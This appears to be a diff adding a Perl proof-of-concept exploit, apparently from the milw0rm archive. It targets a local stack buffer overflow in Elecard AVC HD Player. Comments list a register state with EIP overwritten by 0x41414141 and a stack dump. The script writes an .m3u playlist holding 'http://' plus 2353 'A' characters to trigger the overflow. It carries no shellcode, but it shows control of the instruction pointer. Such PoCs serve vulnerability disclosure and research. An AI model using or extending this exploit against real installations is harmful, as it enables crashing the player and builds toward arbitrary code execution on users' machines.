@@ -1,0 +1,44 @@
+#!/usr/bin/perl
+#Elecard AVC HD PLAYER m3u/xpl file Local Stack Overflow POC
+#Found By AlpHaNiX
+#From NullArea.Net
+###########################
+#    proof of concept    
+###########################
+#Stack Get Overflowed Starting from 2353 char
+#EIP overitten
+#------------------
+#     REGISTRES   
+#------------------
+#EAX 00000000
+#ECX 41414141
+#EDX 775A104D ntdll.775A104D
+#EBX 00000000
+#ESP 0012BC9C
+#EBP 0012BCBC
+#ESI 00000000
+#EDI 00000000
+#EIP 41414141
+#------------------
+#  Dump From Stack
+#------------------
+#0012D000   41414141
+#0012D004   41414141
+#0012D008   41414141
+#0012D00C   41414141
+#0012D010   41414141
+#0012D014   41414141
+#0012D018   41414141
+#0012D01C   41414141
+#0012D020   41414141
+#0012D024   41414141
+#0012D028   41414141
+
+my $file = "alpix.m3u" ;
+my $poc="http://"."A" x 2353 ;
+open(alpix, ">>$file") or die "Cannot open $file";
+print alpix $poc;
+close(alpix);
+print "\n[+] done ! , $file created";
+
+# milw0rm.com [2009-02-02]
